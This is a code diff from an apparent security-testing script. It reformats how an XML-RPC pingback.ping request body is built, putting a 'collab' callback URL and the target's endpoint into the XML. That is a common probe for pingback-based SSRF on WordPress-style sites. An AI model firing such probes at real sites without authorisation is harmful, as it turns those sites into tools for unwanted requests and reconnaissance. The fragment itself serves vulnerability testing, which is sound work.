@@ -45,23 +45,19 @@ def main():
                 'Accept-Language': 'en-US,en;q=0.9',
                 'Connection': 'close',
                 }
-            target_data = \ #post data in xml
-                '''<?xml version="1.0" encoding="UTF-8"?>\r
+            # post data in xml
+            target_data = '''<?xml version="1.0" encoding="UTF-8"?>\r
 <methodCall>\r
 <methodName>pingback.ping</methodName>\r
 <params>\r
 <param>\r
 <value>\r
-<string>http://''' \
-                + collab \
-                + '''\r
+<string>http://''' + collab + '''\r
 </string></value>\r
 </param>\r
 <param>\r
 <value>\r
-<string>''' \
-                + base_url + endpoint \
-                + '''</string></value>\r
+<string>''' + base_url + endpoint + '''</string></value>\r
 </param>\r
 </params>\r
 </methodCall>'''
